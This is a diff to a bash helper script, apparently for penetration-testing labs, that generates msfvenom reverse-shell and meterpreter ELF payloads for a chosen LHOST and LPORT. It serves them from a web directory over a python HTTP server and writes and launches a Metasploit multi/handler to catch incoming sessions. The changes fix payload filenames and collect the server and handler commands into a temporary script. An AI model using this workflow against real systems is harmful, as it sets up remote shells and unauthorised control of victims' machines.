@@ -94,6 +94,8 @@ do
 
    while [ "$flg" = "0" ]
    do
+      echo '32bit:x86/i386/i686/IA-32' 
+      echo '64bit:x64/x86_64/x86-64/AMD64/IA-64/Intel 64'
       read -p  'X86 or X64 (86/64) >' bit
 
       if [ -z $bit ] ; then
@@ -193,14 +195,14 @@ do
          else
             if [ $ftype = "elf" ] ; then
                script1="msfvenom -p linux/x86/shell/reverse_tcp LHOST="$lhost" LPORT="$lport" -f elf > /root/www/revshell/$IP/linux_86_shell_$lhost"_"$lport.elf"
-               script2="cp /root/www/revshell/$IP/linux_86_meter_$lhost"_"$lport.elf /root/Lab/$IP/sandbox"	
+               script2="cp /root/www/revshell/$IP/linux_86_shell_$lhost"_"$lport.elf /root/Lab/$IP/sandbox"	
             fi
          fi
       else   
          if [ $payload = "m" ] ; then
             if [ $ftype = "elf" ] ; then
                script1="msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST="$lhost" LPORT="$lport" -f elf > /root/www/revshell/$IP/linux_64_meter_$lhost"_"$lport.elf"
-               script2="cp /root/www/revshell/$IP/linux_64_shell_$lhost"_"$lport.elf /root/Lab/$IP/sandbox"	
+               script2="cp /root/www/revshell/$IP/linux_64_meter_$lhost"_"$lport.elf /root/Lab/$IP/sandbox"	
             fi
          else
             if [ $ftype = "elf" ] ; then
@@ -248,13 +250,15 @@ do
       echo $script2 >> /root/Lab/$IP/sandbox/revshell.sh
       cat /root/Lab/$IP/sandbox/revshell.sh
       chmod 777 /root/Lab/$IP/sandbox/revshell.sh
-      ./root/Lab/$IP/sandbox/revshell.sh
+      /root/Lab/$IP/sandbox/revshell.sh
       flg0=1      
    fi   
 done
 
 flg=0
 input=""
+rm /root/Lab/$IP/sandbox/temp.sh
+touch /root/Lab/$IP/sandbox/temp.sh
 
 while [ "$flg" = "0" ]
 do
@@ -268,8 +272,8 @@ done
 
 if [ $input = 'Y' ] || [ $input = 'y' ] ; then
    read -p "What port? > " input2
-   cd /root/www
-   python3 -m http.server $input2
+   echo "cd /root/www" >> /root/Lab/$IP/sandbox/temp.sh
+   echo "python3 -m http.server $input2" >> /root/Lab/$IP/sandbox/temp.sh
 fi 
 
 flg=0
@@ -289,12 +293,13 @@ if [ $input = 'Y' ] || [ $input = 'y' ] ; then
    rm /root/Lab/$IP/sandbox/multi_handler.rc
    touch /root/Lab/$IP/sandbox/multi_handler.rc
    echo "use exploit/multi/handler" >> /root/Lab/$IP/sandbox/multi_handler.rc
-   echo "set PAYLOAD "$(head -n 1 revshell.sh | cut -d " " -f3) >> /root/Lab/$IP/sandbox/multi_handler.rc
+   echo "set PAYLOAD "$(head -n 1 /root/Lab/$IP/sandbox/revshell.sh | cut -d " " -f3) >> /root/Lab/$IP/sandbox/multi_handler.rc
    echo "set LHOST "$lhost >> /root/Lab/$IP/sandbox/multi_handler.rc
    echo "set LPORT "$lport >> /root/Lab/$IP/sandbox/multi_handler.rc
    echo "set ExitOnSession false" >> /root/Lab/$IP/sandbox/multi_handler.rc
    echo "exploit -j -z" >> /root/Lab/$IP/sandbox/multi_handler.rc
    cat /root/Lab/$IP/sandbox/multi_handler.rc
-   msfconsole -r /root/Lab/$IP/sandbox/multi_handler.rc
+   echo "msfconsole -r /root/Lab/$IP/sandbox/multi_handler.rc" >> /root/Lab/$IP/sandbox/temp.sh
 fi
-
+chmod 777 /root/Lab/$IP/sandbox/temp.sh
+/root/Lab/$IP/sandbox/temp.sh
